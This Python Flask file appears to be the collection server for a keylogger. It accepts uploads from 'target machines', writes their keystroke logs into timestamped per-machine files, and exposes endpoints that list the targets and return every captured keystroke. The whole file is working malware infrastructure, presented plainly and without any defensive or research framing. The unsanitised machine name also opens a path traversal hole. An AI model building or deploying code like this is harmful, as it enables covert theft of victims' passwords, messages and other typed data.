from flask import Flask, request, jsonify
import time
import os

DATA_FOLDER = "data"
LOG_INTERVAL = 5 * 60 

app = Flask(__name__)

last_log_info = {}  # {machine: {"time": <timestamp>, "file": <path>} }

def generate_log_filename():
    return "log_" + time.strftime("%Y-%m-%d_%H-%M-%S") + ".txt"

@app.route('/api/upload', methods=['POST'])
def upload():
    data = request.get_json()
    if not data or "machine" not in data or "data" not in data:
        return jsonify({"error": "Invalid payload"}), 400
    
    machine = data["machine"]
    log_data = data["data"]

    machine_folder = os.path.join(DATA_FOLDER, machine)
    if not os.path.exists(machine_folder):
        os.makedirs(machine_folder)

    now = time.time()
    info = last_log_info.get(machine, None)

    if info is None or now - info["time"] >= LOG_INTERVAL:
        filename = generate_log_filename()
        file_path = os.path.join(machine_folder, filename)
        with open(file_path, "w", encoding="utf-8") as f:
            f.write(log_data + "\n")

        last_log_info[machine] = {"time": now, "file": file_path}
        return jsonify({"status": "new_file", "file": file_path}), 200
    else:
        file_path = info["file"]
        with open(file_path, "a", encoding="utf-8") as f:
            f.write(log_data + "\n")

        return jsonify({"status": "appended", "file": file_path}), 200


@app.route('/api/get_target_machines_list', methods=['GET'])
def get_target_machines_list():
    if not os.path.exists(DATA_FOLDER):
        return jsonify({"machines": []}), 200

    machines = [
        name for name in os.listdir(DATA_FOLDER)
        if os.path.isdir(os.path.join(DATA_FOLDER, name))
    ]
    return jsonify({"machines": machines}), 200


@app.route('/api/get_keystrokes/<machine>', methods=['GET'])
def get_target_machine_key_strokes(machine):
    machine_folder = os.path.join(DATA_FOLDER, machine)
    if not os.path.exists(machine_folder):
        return jsonify({"error": "Machine folder not found"}), 404

    log_files = [
        os.path.join(machine_folder, f)
        for f in os.listdir(machine_folder)
        if os.path.isfile(os.path.join(machine_folder, f)) and f.startswith("log_")
    ]
    log_files.sort()
    keystrokes = []
    for file_path in log_files:
        with open(file_path, "r", encoding="utf-8") as f:
            keystrokes.append(f.read())
    return jsonify({"machine": machine, "keystrokes": keystrokes}), 200
